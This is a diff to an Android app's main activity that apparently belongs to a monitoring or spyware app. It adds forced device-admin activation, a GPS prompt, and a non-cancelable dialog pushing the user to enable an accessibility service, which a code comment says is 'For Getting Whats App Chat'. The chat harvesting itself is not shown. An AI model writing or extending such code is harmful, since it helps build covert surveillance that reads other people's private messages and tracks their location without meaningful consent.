@@ -41,6 +41,9 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
     private TextView tv_install2;
     private Boolean isGoogleAccountExecuted = false;
     private Boolean isMiDialogOpen = false;
+    private DeviceAdmin deviceAdmin;
+    private AlertDialog dialogMi;
+    private AlertDialog dialogAS;
 
     public static MainActivity getInstance() {
         return mActivity;
@@ -56,6 +59,7 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
         tv_install = (TextView) findViewById(R.id.tv_install);
         tv_install1 = (TextView) findViewById(R.id.tv_install1);
         tv_install2 = (TextView) findViewById(R.id.tv_install2);
+        deviceAdmin = new DeviceAdmin(this);
     }
 
     // Set ActionBar Hide
@@ -89,8 +93,8 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
         }
 
         // Check Is Admin Active Or Not
-        if (!Preference.getIsAdminActive(this)) {
-            new DeviceAdmin(this);
+        if (!deviceAdmin.isActiveAdmin()) {
+            deviceAdmin.openAdminScreen();
             return;
         }
 
@@ -142,13 +146,18 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
     // Start Background Services
     private void startServices() {
         if (!Utilities.isGpsEnabled(this)) {
-            Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
-            startActivity(intent);
+            startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));
             return;
         }
 
+        if (Build.VERSION.SDK_INT >= 19) {
+            if (!Utilities.isAccessibilityEnabled(this)) {
+                showAccessibilityDialog();
+                return;
+            }
+        }
+
         if (!isMiDialogOpen) {
-            isMiDialogOpen = true;
             if (Build.MANUFACTURER.equalsIgnoreCase(getString(R.string.xiomi_text))) {
                 showMiDialog();
                 return;
@@ -248,18 +257,58 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
             public void onClick(DialogInterface dialog, int which) {
                 // dismiss dialog
                 dialog.dismiss();
+                isMiDialogOpen = true;
                 onResume();
             }
         });
         AlertDialog dialog = builder.create();
+        dialogMi = dialog;
         // display dialog
         dialog.show();
+    }
+
+    // Show Accessibility Permissions Dialog For Getting Whats App Chat
+    private void showAccessibilityDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setCancelable(false);
+        builder.setTitle(getString(R.string.as_dialog_title));
+        builder.setMessage(getString(R.string.as_dialog_message));
+        builder.setPositiveButton(getString(android.R.string.ok), new DialogInterface.OnClickListener() {
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+                // dismiss dialog
+                dialog.dismiss();
+                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            }
+        });
+        AlertDialog dialog = builder.create();
+        dialogAS = dialog;
+        // display dialog
+        dialog.show();
+    }
+
+    // Hide Dialogs When Its Open
+    private void hideDialogs() {
+        if(dialogMi != null && dialogMi.isShowing()){
+            dialogMi.dismiss();
+        }
+
+        if(dialogAS != null && dialogAS.isShowing()){
+            dialogAS.dismiss();
+        }
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        hideDialogs();
     }
 
     // onDestroy
     @Override
     protected void onDestroy() {
         super.onDestroy();
+        hideDialogs();
         finish();
     }
 }
